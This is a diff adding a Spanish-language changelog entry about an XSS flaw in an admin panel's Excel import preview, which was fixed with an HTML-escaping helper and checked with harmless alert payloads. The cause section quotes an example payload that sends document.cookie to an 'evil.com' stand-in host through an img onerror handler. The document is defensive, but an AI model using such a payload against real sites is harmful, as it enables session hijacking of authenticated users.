@@ -1385,3 +1385,45 @@ por separado para confirmar que generan HTML valido sin errores de sintaxis.
 
 **Archivos modificados:** `database/nimbo_db.py`, `app.py`, `templates/index.html`,
 `CLAUDE.md`.
+
+---
+
+## [2026-07-19] XSS en el preview/resultado de importación de Excel
+
+**Problema:** el review de seguridad automático del commit anterior (plugin
+`security-guidance@claude-code-plugins`) encontró que el modal de importación masiva de
+productos (agregado en la instalación anterior, ver entrada de "importación de Excel
+con preview y mapeo de columnas") armaba el HTML del preview de columnas, la lista de
+errores y la lista de duplicados con template strings interpolados directo en
+`innerHTML`, sin escapar ningún valor.
+
+**Causa:** los encabezados y las celdas que se muestran en esas 3 tablas vienen
+literalmente del archivo Excel/CSV que el usuario acaba de subir - datos no confiables
+por definición. Un encabezado o una celda con algo como `<img src=x
+onerror=fetch('https://evil.com/steal?c='+document.cookie)>` se interpretaba como HTML
+real al insertarse en `innerHTML`, en vez de mostrarse como texto - se hubiera
+ejecutado dentro de la sesión ya autenticada del admin (con acceso a usuarios,
+configuración, contabilidad, etc.), no en una sandbox aislada. Bastaba con que un
+proveedor o un tercero le mandara al admin un "listado de productos" con ese
+encabezado disfrazado de columna rara, y que el admin lo subiera para previsualizarlo.
+
+**Cómo se arregló:** se agregó `escHtml(valor)` en `templates/index.html` - crea un
+`<div>` de verdad, le asigna el valor a `textContent` (que nunca interpreta HTML), y
+lee de vuelta `innerHTML` (que sí devuelve el texto ya escapado) - mismo patrón que
+usa cualquier librería de sanitización simple, sin agregar una dependencia nueva. Se
+aplicó a las 3 tablas que muestran datos del archivo subido: el preview de columnas
+(encabezados y celdas), la lista de errores de importación (el `motivo` incluye el
+nombre del producto tal como venía en la fila) y la lista de duplicados detectados
+(nombre del producto entrante). Los valores que SÍ son fijos/controlados por el
+servidor (las etiquetas de `campos_disponibles`, los precios/stock ya validados como
+número) se dejaron sin escapar a propósito - no hacía falta, y escaparlos todo
+uniformemente hubiera sido ruido de más sin beneficio real.
+
+**Verificación:** se extrajeron las funciones de renderizado con Node.js (mismo
+mecanismo ya usado para probar `textoChatSinInventario()` en la instalación anterior)
+y se les pasó un payload simulando un archivo malicioso (`<img src=x
+onerror=alert(1)>` como encabezado, `<script>alert(2)</script>` como celda) - el HTML
+generado mostró `&lt;img src=x onerror=alert(1)&gt;` y `&lt;script&gt;alert(2)&lt;
+/script&gt;` como texto escapado, no como etiquetas reales.
+
+**Archivos modificados:** `templates/index.html`.
